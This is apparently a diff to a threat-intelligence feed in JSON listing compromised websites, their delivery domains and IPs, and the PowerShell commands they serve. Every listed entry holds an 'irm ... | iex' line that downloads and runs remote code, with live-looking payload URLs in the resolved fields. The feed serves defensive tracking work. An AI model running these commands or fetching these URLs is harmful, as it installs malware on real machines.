@@ -1,5 +1,133 @@
 [
   {
+    "UrlDomain": "constanzaexclusive.com",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "91.108.98.35"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/55f33c8c387348f5",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29927457",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&_v=29927457",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/55f33c8c387348f5'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/55f33c8c387348f5"
+    ],
+    "ReportId": "cmwwq5mb206r50oml3mrorb4l",
+    "ScannedAt": "2026-11-25T22:58:14.497000+00:00"
+  },
+  {
+    "UrlDomain": "www.michaelmahin.com",
+    "DeliveryUrl": [
+      "hagosuro.lc"
+    ],
+    "PayloadUrl": [
+      "http://hagosuro.lc/dantestraff18/9956ca98593d95f4"
+    ],
+    "IP": [
+      "23.229.196.69"
+    ],
+    "Related": [],
+    "Payload": "(irm 'http://hagosuro[.]lc/dantestraff18/9956ca98593d95f4' -UserAgent 'WUA/bdda1e77b2' -Headers @{'X-WUA'='bdda1e77b2'})|iex",
+    "ResolvedDownloadUrl": [
+      "http://hagosuro.lc/dantestraff18/9956ca98593d95f4"
+    ],
+    "ReportId": "cmwwq0pjk06lv0oml745rpk3x",
+    "ScannedAt": "2026-11-25T22:54:25.415000+00:00"
+  },
+  {
+    "UrlDomain": "hotelvalgus.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/Girya/a5e49da2eb6f1960"
+    ],
+    "IP": [
+      "131.153.169.44"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/Girya/a5e49da2eb6f1960')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/Girya/a5e49da2eb6f1960"
+    ],
+    "ReportId": "cmwwpvyjw06j40oml2v4jns73",
+    "ScannedAt": "2026-11-25T22:50:43.789000+00:00"
+  },
+  {
+    "UrlDomain": "elessarcorgis.co.uk",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/6e377c27970e7c39"
+    ],
+    "IP": [
+      "172.67.205.49"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/6e377c27970e7c39')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/6e377c27970e7c39"
+    ],
+    "ReportId": "cmwwpkl2p065f0oml3pmyhozf",
+    "ScannedAt": "2026-11-25T22:41:53.114000+00:00"
+  },
+  {
+    "UrlDomain": "coachingwithuzma.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/ee0a397ab22d5ac6"
+    ],
+    "IP": [
+      "160.153.0.106"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/ee0a397ab22d5ac6')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/ee0a397ab22d5ac6"
+    ],
+    "ReportId": "cmwwpjqye06390omloxfik3xb",
+    "ScannedAt": "2026-11-25T22:41:14.026000+00:00"
+  },
+  {
+    "UrlDomain": "drmanishavijayvargiya.in",
+    "DeliveryUrl": [
+      "browse-login.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.25"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-login.info/edef55d135d02fe5",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-login[.]info/edef55d135d02fe5'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-login.info/edef55d135d02fe5"
+    ],
+    "ReportId": "cmwwpisqa06030omlsostrwfv",
+    "ScannedAt": "2026-11-25T22:40:29.736000+00:00"
+  },
+  {
     "UrlDomain": "www.irohanature.us",
     "DeliveryUrl": [
       "browse-login.info"
@@ -880,25 +1008,5 @@
     ],
     "ReportId": "cmwvgcc250ejp0nml79vyx8ba",
     "ScannedAt": "2026-11-25T01:35:45.447000+00:00"
-  },
-  {
-    "UrlDomain": "aga-pics.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "143.95.235.24"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/be1c-3b11c244d2b2/bc99-45b9-a035-f6af7c134dd7/-/raw/main/7F5-4410-9a93-F371ffdFaF84 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/be1c-3b11c244d2b2/bc99-45b9-a035-f6af7c134dd7/-/raw/main/7F5-4410-9a93-F371ffdFaF84"
-    ],
-    "ReportId": "cmwv9t2zk0eit0nmljfzv0sd0",
-    "ScannedAt": "2026-11-24T22:32:49.589000+00:00"
   }
 ]
